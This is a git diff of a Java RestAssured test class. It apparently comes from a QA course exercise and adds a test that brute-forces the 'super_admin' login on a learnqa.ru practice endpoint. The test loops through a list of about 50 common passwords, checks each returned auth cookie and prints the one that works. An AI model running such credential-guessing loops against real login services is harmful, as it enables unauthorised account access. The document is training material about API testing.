@@ -5,6 +5,9 @@ import io.restassured.path.json.JsonPath;
 import io.restassured.response.Response;
 import org.junit.jupiter.api.Test;
 
+import java.util.Arrays;
+import java.util.List;
+
 public class HelloWorldTest {
     @Test
     public void jsonParsingTest() {
@@ -80,6 +83,42 @@ public class HelloWorldTest {
 
             if ("Job is ready".equals(responseAfterTaskReady.get("status")) && (responseAfterTaskReady.get("result") != null)) {
                 System.out.println("We got it");
+            }
+        }
+    }
+
+    @Test
+    public void getSecretPasswordTest() {
+        String login = "super_admin";
+        List<String> passwords = Arrays.asList(
+                "12345", "123456789", "12345678", "qwerty", "abc123", "12345", "1234567", "letmein", "dragon", "monkey", "111111",
+                "baseball", "iloveyou", "sunshine", "trustno1", "master", "ashley", "bailey", "passw0rd", "shadow", "654321",
+                "jesus", "password1", "football", "000000", "sunshine", "solo", "adobe123", "adobe", "admin", "princess",
+                "photoshop", "mustang", "starwars", "654321", "1q2w3e4r", "qwerty123", "555555", "ashley", "lovely", "!@#$%^&*",
+                "welcome", "qazwsx", "zaq1zaq1", "michael", "hottie", "freedom", "donald", "access"
+        );
+
+        for (String pass : passwords) {
+            Response response = RestAssured
+                    .given()
+                    .queryParam("login", login)
+                    .queryParam("password", pass)
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+
+            String responseCookie = response.getCookie("auth_cookie");
+
+            Response checkResponse = RestAssured
+                    .given()
+                    .cookie("auth_cookie", responseCookie)
+                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                    .andReturn();
+
+            String resultCheck = checkResponse.asString();
+
+            if (!resultCheck.contains("You are NOT authorized")) {
+                System.out.println("Correct pass " + pass);
+                System.out.println("Response " + resultCheck);
             }
         }
     }
